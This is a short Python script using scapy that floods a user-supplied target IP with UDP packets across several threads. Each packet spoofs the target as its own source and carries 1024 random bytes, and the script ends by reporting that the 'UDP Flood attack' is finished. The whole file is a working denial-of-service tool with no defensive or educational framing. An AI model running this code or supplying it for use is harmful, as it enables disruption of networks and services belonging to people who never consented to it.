from scapy.all import *
import threading
import os

def udp_flood(target_ip, num_packets):
    for _ in range(num_packets):
        packet = IP(src=target_ip, dst=target_ip)/UDP(sport=80, dport=80)/Raw(load=RandString(size=1024))
        send(packet, verbose=False)

def main():
    os.system("clear")
    target_ip = input("Enter the target IP: ")
    total_packets = int(input("Enter the total number of packets: "))
    thread_count = int(input("Enter the number of threads: "))

    packets_per_thread = total_packets // thread_count
    extra_packets = total_packets % thread_count

    threads = []
    for i in range(thread_count):
        num_packets = packets_per_thread + (1 if i < extra_packets else 0)
        thread = threading.Thread(target=udp_flood, args=(target_ip, num_packets))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"UDP Flood attack finished. Total packets sent: {total_packets}")

if __name__ == "__main__":
    main()
